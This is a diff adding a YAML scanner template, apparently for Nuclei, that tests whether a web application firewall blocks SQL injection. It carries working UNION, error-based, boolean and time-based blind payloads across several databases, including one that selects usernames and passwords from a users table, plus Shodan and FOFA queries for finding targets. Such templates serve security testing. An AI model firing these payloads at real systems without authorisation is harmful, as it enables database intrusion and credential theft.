@@ -1,0 +1,142 @@
+id: waf-sqli-basic-bypass
+info:
+  name: WAF SQL Injection Basic Bypass
+  author: waftester
+  severity: critical
+  description: |
+    Tests WAF effectiveness against fundamental SQL injection vectors.
+    Covers UNION-based, error-based, boolean blind, time-based blind,
+    and stacked query injection techniques across multiple DBMS targets
+    (MySQL, PostgreSQL, MSSQL, Oracle, SQLite).
+  reference:
+    - https://owasp.org/www-community/attacks/SQL_Injection
+    - https://portswigger.net/web-security/sql-injection
+    - https://cheatsheetseries.owasp.org/cheatsheets/SQL_Injection_Prevention_Cheat_Sheet.html
+    - https://github.com/swisskyrepo/PayloadsAllTheThings/tree/master/SQL%20Injection
+  tags: sqli,waf,bypass,owasp-a03,injection,waftester
+  classification:
+    cwe-id:
+      - CWE-89
+      - CWE-693
+  metadata:
+    verified: true
+    max-request: 20
+    shodan-query: "http.waf"
+    fofa-query: "header=\"WAF\""
+
+http:
+  # Layer 1: UNION-based injection - multiple column counts and DB targets
+  - method: GET
+    path:
+      - "{{BaseURL}}/?id=1' UNION SELECT 1,2,3--"
+      - "{{BaseURL}}/?id=1' UNION SELECT 1,2,3,4,5--"
+      - "{{BaseURL}}/?id=1' UNION ALL SELECT NULL,NULL,NULL--"
+      - "{{BaseURL}}/?id=-1 UNION SELECT table_name,column_name,3 FROM information_schema.columns--"
+      - "{{BaseURL}}/?id=0 UNION SELECT username,password,email FROM users--"
+
+    matchers-condition: and
+    matchers:
+      - type: dsl
+        dsl:
+          - "status_code != 403 && status_code != 406 && status_code != 429 && status_code != 503"
+      - type: word
+        part: body
+        words:
+          - "403"
+          - "Forbidden"
+          - "Access Denied"
+          - "blocked"
+          - "Request Rejected"
+          - "not acceptable"
+          - "WAF"
+        negative: true
+        condition: or
+
+    extractors:
+      - type: regex
+        part: body
+        group: 1
+        regex:
+          - "(?i)(mysql|mariadb|postgresql|oracle|mssql|sqlite|sql server)"
+
+  # Layer 2: Error-based injection - extract data through error messages
+  - method: GET
+    path:
+      - "{{BaseURL}}/?id=1' AND extractvalue(1,concat(0x7e,version()))--"
+      - "{{BaseURL}}/?id=1' AND updatexml(1,concat(0x7e,version()),1)--"
+      - "{{BaseURL}}/?id=1' AND (SELECT 1 FROM(SELECT COUNT(*),CONCAT(version(),FLOOR(RAND(0)*2))x FROM information_schema.tables GROUP BY x)a)--"
+      - "{{BaseURL}}/?id=1 AND 1=CONVERT(int,(SELECT @@version))--"
+      - "{{BaseURL}}/?id=1' AND JSON_KEYS((SELECT CONVERT((SELECT GROUP_CONCAT(table_name) FROM information_schema.tables) USING utf8)))--"
+
+    matchers-condition: and
+    matchers:
+      - type: word
+        part: body
+        words:
+          - "SQL syntax"
+          - "mysql_fetch"
+          - "Warning: mysql"
+          - "Unclosed quotation mark"
+          - "Microsoft OLE DB Provider"
+          - "XPATH syntax error"
+          - "SQLSTATE"
+          - "pg_query"
+          - "ORA-"
+          - "SQLite3::"
+          - "ODBC SQL Server"
+        condition: or
+      - type: word
+        part: body
+        words:
+          - "403"
+          - "Forbidden"
+          - "blocked"
+        negative: true
+        condition: or
+
+  # Layer 3: Boolean blind injection
+  - method: GET
+    path:
+      - "{{BaseURL}}/?id=1' AND 1=1-- -"
+      - "{{BaseURL}}/?id=1' AND 1=2-- -"
+      - "{{BaseURL}}/?id=1' OR '1'='1"
+      - "{{BaseURL}}/?id=1' OR ''='"
+      - "{{BaseURL}}/?id=1 AND SUBSTRING(@@version,1,1)=5"
+
+    matchers-condition: and
+    matchers:
+      - type: dsl
+        dsl:
+          - "status_code == 200"
+      - type: word
+        part: body
+        words:
+          - "403"
+          - "Forbidden"
+          - "blocked"
+          - "Request Rejected"
+        negative: true
+        condition: or
+
+  # Layer 4: Time-based blind injection
+  - method: GET
+    path:
+      - "{{BaseURL}}/?id=1' AND SLEEP(3)-- -"
+      - "{{BaseURL}}/?id=1'; WAITFOR DELAY '0:0:3'--"
+      - "{{BaseURL}}/?id=1' AND BENCHMARK(5000000,SHA1('test'))-- -"
+      - "{{BaseURL}}/?id=1' AND pg_sleep(3)--"
+      - "{{BaseURL}}/?id=1' OR IF(1=1,SLEEP(3),0)-- -"
+
+    matchers-condition: and
+    matchers:
+      - type: dsl
+        dsl:
+          - "status_code != 403 && status_code != 406 && status_code != 503"
+      - type: word
+        part: body
+        words:
+          - "403"
+          - "Forbidden"
+          - "blocked"
+        negative: true
+        condition: or
